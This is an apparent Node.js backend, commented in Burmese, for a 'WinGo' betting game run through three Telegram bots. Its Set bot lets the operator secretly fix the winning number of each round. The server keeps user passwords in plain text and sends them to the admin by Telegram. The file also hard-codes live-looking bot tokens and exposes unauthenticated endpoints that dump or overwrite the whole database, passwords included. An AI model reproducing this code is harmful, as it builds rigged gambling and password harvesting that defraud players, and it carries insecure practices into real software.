const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(cors());
app.use(express.json());

// ==========================================
// 🔥 သင့်၏ Bot Token များ (ပြင်စရာမလိုပါ)
// ==========================================
const SET_BOT_TOKEN = '9197617448:AAEnS3-wmucnZ9jiEPsyNoAMs_AjniNHFEg';
const FINANCE_BOT_TOKEN = '9199518779:AAFgTO22IX6Cb5AU8ui3FIIcV42MPNovBPw';
const USER_BOT_TOKEN = '9092936025:AAGDYORAcX50Z0EjjYTlUXwUOZa-cOaO0tc';

const botSet = new TelegramBot(SET_BOT_TOKEN, {polling: true});
const botFinance = new TelegramBot(FINANCE_BOT_TOKEN, {polling: true});
const botUser = new TelegramBot(USER_BOT_TOKEN, {polling: true});

// Database
let DB = {
  users: {},
  settings: { 
      adminChatId: null, // Admin ID ကို အလိုအလျောက် မှတ်သားမည့်နေရာ
      autoDraw: { wingo30s: true, wingo1m: true, wingo3m: true, wingo5m: true }, 
      manualNum: { wingo30s: null, wingo1m: null, wingo3m: null, wingo5m: null }, 
      serverActive: true, 
      links: [] 
  },
  currentGame: 'wingo30s',
  games: {
    wingo30s: { bets: [], history: [], myBets: [], lastBlock: null, todayProfit: 0, todayComm: 0, currentPeriodProfit: 0, currentPeriodComm: 0 },
    wingo1m: { bets: [], history: [], myBets: [], lastBlock: null, todayProfit: 0, todayComm: 0, currentPeriodProfit: 0, currentPeriodComm: 0 },
    wingo3m: { bets: [], history: [], myBets: [], lastBlock: null, todayProfit: 0, todayComm: 0, currentPeriodProfit: 0, currentPeriodComm: 0 },
    wingo5m: { bets: [], history: [], myBets: [], lastBlock: null, todayProfit: 0, todayComm: 0, currentPeriodProfit: 0, currentPeriodComm: 0 }
  }
};

// လုံခြုံရေး စစ်ဆေးသည့် Function
function isAdmin(chatId) {
    return DB.settings.adminChatId && chatId.toString() === DB.settings.adminChatId.toString();
}

// ====================================================
// 🔥 1-Click Admin Setup (ကုဒ်ပြင်စရာမလိုသည့် Auto လော့ခ်စနစ်)
// ====================================================
[botSet, botFinance, botUser].forEach(bot => {
    bot.onText(/\/admin/, (msg) => {
        if (!DB.settings.adminChatId) {
            DB.settings.adminChatId = msg.chat.id.toString();
            bot.sendMessage(msg.chat.id, `✅ ဂုဏ်ယူပါတယ်။ သင်သည် Admin အဖြစ် အောင်မြင်စွာ ချိတ်ဆက်ပြီးပါပြီ။\nယခုမှစ၍ အခြားမည်သူမှ ဤ Bot များကို သုံး၍မရအောင် လုံခြုံရေးသော့ခတ်လိုက်ပါပြီ။`);
        } else if (isAdmin(msg.chat.id)) {
            bot.sendMessage(msg.chat.id, `✅ သင်သည် လက်ရှိ Admin ဖြစ်ပါသည်။ စနစ်များ ပုံမှန်အလုပ်လုပ်နေပါသည်။`);
        } else {
            bot.sendMessage(msg.chat.id, `❌ တောင်းပန်ပါသည်။ Admin တစ်ဦး သတ်မှတ်ပြီးသား ဖြစ်နေပါသည်။ သင့်တွင် အသုံးပြုခွင့် မရှိပါ။`);
        }
    });
});

// ====================================================
// ၁။ Set Bot (ဂဏန်းကြိုတင်သတ်မှတ်ရန်) 
// ====================================================
botSet.onText(/\/set (\w+) (\d)/, (msg, match) => {
    if(!isAdmin(msg.chat.id)) return botSet.sendMessage(msg.chat.id, "❌ သင့်တွင် အသုံးပြုခွင့် မရှိပါ။ Admin အကောင့်မှသာ အသုံးပြုပါ။");
    
    const game = match[1];
    const num = parseInt(match[2]);

    if(DB.settings.manualNum[game] !== undefined) {
        DB.settings.manualNum[game] = num;
        DB.settings.autoDraw[game] = false;
        botSet.sendMessage(msg.chat.id, `🎯 ${game} အတွက် ထွက်မည့်ဂဏန်းကို [ ${num} ] ဟု သတ်မှတ်ပြီးပါပြီ။ (Auto Draw ပိတ်သွားပါမည်)`);
    } else {
        botSet.sendMessage(msg.chat.id, `⚠️ ဂိမ်းအမည်မှားနေသည်။ (wingo30s, wingo1m, wingo3m, wingo5m ဟုသာရိုက်ပါ)`);
    }
});

// ====================================================
// ၂။ Finance Bot (ငွေစာရင်း) 
// ====================================================
botFinance.onText(/\/(add|sub) (\w+) (\d+)/, (msg, match) => {
    if(!isAdmin(msg.chat.id)) return botFinance.sendMessage(msg.chat.id, "❌ သင့်တွင် အသုံးပြုခွင့် မရှိပါ။ Admin အကောင့်မှသာ အသုံးပြုပါ။");
    
    const cmd = match[1];
    const uid = match[2];
    const amount = parseInt(match[3]);

    let userKey = Object.keys(DB.users).find(k => DB.users[k].id === uid);
    if(!userKey) return botFinance.sendMessage(msg.chat.id, `❌ UID: ${uid} ရှာမတွေ့ပါ။`);

    if(cmd === 'add') {
        DB.users[userKey].balance += amount;
        botFinance.sendMessage(msg.chat.id, `✅ ငွေသွင်းအောင်မြင်ပါသည်။\n👤 အမည်: ${DB.users[userKey].name}\n🆔 UID: ${uid}\n💰 လက်ကျန်ငွေ: ${DB.users[userKey].balance.toLocaleString()} Ks`);
    } else {
        DB.users[userKey].balance -= amount;
        botFinance.sendMessage(msg.chat.id, `✅ ငွေဖြတ်တောက်မှု အောင်မြင်ပါသည်။\n👤 အမည်: ${DB.users[userKey].name}\n🆔 UID: ${uid}\n💰 လက်ကျန်ငွေ: ${DB.users[userKey].balance.toLocaleString()} Ks`);
    }
});

// ====================================================
// ၃။ User Bot (အချက်အလက် စစ်ဆေးရန်) 
// ====================================================
botUser.onText(/\/check (\w+)/, (msg, match) => {
    if(!isAdmin(msg.chat.id)) return botUser.sendMessage(msg.chat.id, "❌ သင့်တွင် အသုံးပြုခွင့် မရှိပါ။ Admin အကောင့်မှသာ အသုံးပြုပါ။");
    
    const uid = match[1];
    let userKey = Object.keys(DB.users).find(k => DB.users[k].id === uid);
    if(userKey) {
        let u = DB.users[userKey];
        botUser.sendMessage(msg.chat.id, `👤 User အချက်အလက်\n\n▫️ အမည်: ${u.name}\n▫️ ဖုန်း: ${u.phone}\n▫️ UID: ${u.id}\n▫️ လက်ကျန်ငွေ: ${u.balance.toLocaleString()} Ks\n▫️ စကားဝှက်: ${u.pwd}`);
    } else {
        botUser.sendMessage(msg.chat.id, `❌ UID: ${uid} ရှာမတွေ့ပါ။`);
    }
});

// ====================================================
// Express Server API လမ်းကြောင်းများ
// ====================================================
app.get('/', (req, res) => res.send('WinGo Backend Server is Running!'));

app.get('/api/db', (req, res) => res.json(DB));

app.post('/api/update', (req, res) => {
    const newDB = req.body;
    
    // Frontend မှ Update လုပ်ရာတွင် Admin Chat ID မပျောက်စေရန် ထိန်းသိမ်းခြင်း
    if(DB.settings.adminChatId && !newDB.settings.adminChatId) {
        newDB.settings.adminChatId = DB.settings.adminChatId;
    }

    // 🔥 အကောင့်သစ် ဝင်လာပါက User Bot မှတစ်ဆင့် Admin ဆီသို့ သတိပေးချက်ပို့ရန်
    if (newDB.users && DB.users && Object.keys(newDB.users).length > Object.keys(DB.users).length) {
        for(let phone in newDB.users) {
            if(!DB.users[phone]) {
                let u = newDB.users[phone];
                try {
                    // Admin ရှိမှသာ မက်ဆေ့ချ်ပို့မည်
                    if (newDB.settings.adminChatId) {
                        botUser.sendMessage(newDB.settings.adminChatId, `🎉 အကောင့်သစ် ဝင်လာပါပြီ\n\n▫️ အမည်: ${u.name}\n▫️ ဖုန်း: ${u.phone}\n▫️ UID: ${u.id}\n▫️ စကားဝှက်: ${u.pwd}`);
                    }
                } catch(e) { console.log("Bot Error:", e); }
            }
        }
    }
    
    DB = newDB;
    res.send({ success: true });
});

// ဆာဗာ စတင်ခြင်း
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
